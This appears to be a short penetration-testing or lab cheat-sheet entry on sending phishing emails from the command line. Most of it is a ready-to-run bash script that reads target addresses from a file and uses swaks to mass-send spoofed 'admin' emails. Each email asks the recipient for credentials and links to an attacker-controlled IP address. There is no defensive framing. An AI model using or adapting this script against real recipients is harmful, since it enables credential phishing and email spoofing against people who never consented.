# Sending Phishing Emails - Command Line


## Bash and SWAKS

[URL] (https://ryanstutorials.net/bash-scripting-tutorial/bash-loops.php)

[*] email.txt contains a list of email addresses to phish



```
phishing-script.sh 
#!/bin/sh

while read email; do swaks –to $email –from admin@some-domain –header "Subject: Please send me your creds!" –body "http://10.10.14.49/" –server 10.10.10.10; done < email.txt
```